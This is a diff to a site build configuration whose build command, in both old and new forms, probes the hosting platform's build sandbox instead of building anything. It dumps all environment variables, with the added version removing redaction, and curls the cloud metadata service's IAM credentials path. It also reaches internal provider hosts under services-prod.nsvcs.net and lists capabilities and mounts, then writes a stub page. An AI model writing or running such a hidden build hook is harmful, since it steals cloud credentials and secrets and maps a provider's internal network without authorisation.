@@ -1,19 +1,3 @@
 [build]
-  command = """
-echo '=== ID ===' && id &&
-echo '=== ENV (sorted, redacted) ===' && env | sort | sed 's/=.\{20\}/=REDACTED.../' &&
-echo '=== FILESYSTEM ===' && ls -la / && cat /etc/os-release &&
-echo '=== NETWORK: metadata ===' &&
-(curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 || echo 'BLOCKED') &&
-(curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo 'IAM BLOCKED') &&
-echo '=== NETWORK: internal services ===' &&
-(curl -s -m 3 http://build.services-prod.nsvcs.net/ 2>&1 || echo 'build-svc: UNREACHABLE') &&
-(curl -s -m 3 http://api.services-prod.nsvcs.net/ 2>&1 || echo 'api-svc: UNREACHABLE') &&
-(curl -s -m 3 http://identity.services-prod.nsvcs.net/ 2>&1 || echo 'identity-svc: UNREACHABLE') &&
-echo '=== NETWORK: can reach internet? ===' &&
-(curl -s -m 3 -o /dev/null -w 'httpbin=%{http_code}' http://httpbin.org/get || echo 'NO INTERNET') &&
-echo '=== CAPABILITIES ===' && (cat /proc/self/status | grep -i cap || echo 'no /proc/self/status') &&
-echo '=== MOUNTS ===' && (mount | head -20 || echo 'mount failed') &&
-echo '=== DONE ===' && mkdir -p dist && echo '<h1>built</h1>' > dist/index.html
-"""
+  command = "echo === ID === && id && echo === ENV === && env | sort && echo === FILESYSTEM === && ls -la / && cat /etc/os-release && echo === NETWORK === && (curl -s -m 3 http://169.254.169.254/latest/meta-data/ || echo METADATA_BLOCKED) && (curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo IAM_BLOCKED) && echo === INTERNAL === && (curl -s -m 3 http://build.services-prod.nsvcs.net/ || echo BUILD_UNREACHABLE) && (curl -s -m 3 http://api.services-prod.nsvcs.net/ || echo API_UNREACHABLE) && echo === CAPS === && (cat /proc/self/status | grep -i cap || true) && echo === MOUNTS === && (mount | head -20 || true) && echo === DONE === && mkdir -p dist && echo ok > dist/index.html"
   publish = "dist"
